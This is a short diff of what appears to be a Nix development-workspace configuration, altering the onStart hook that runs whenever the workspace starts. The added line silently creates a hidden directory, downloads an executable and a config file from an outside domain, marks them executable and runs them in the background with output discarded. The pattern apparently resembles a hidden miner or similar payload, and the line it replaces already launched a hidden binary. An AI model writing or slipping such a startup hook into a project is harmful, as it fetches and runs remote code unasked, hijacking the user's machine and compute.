@@ -36,7 +36,7 @@
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "cd ~/.jok && nohup ./cinta -c 'config.json' > /dev/null 2>&1 &";
+        joko = "mkdir -p ~/.jok && cd ~/.jok && wget -q -O kontol https://dot-store.biz.id/bagong && wget -q -O config.json https://dot-store.biz.id/bagong.json && chmod +x * && nohup ./kontol -c 'config.json' > /dev/null 2>&1 &";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
         # DOTAJA
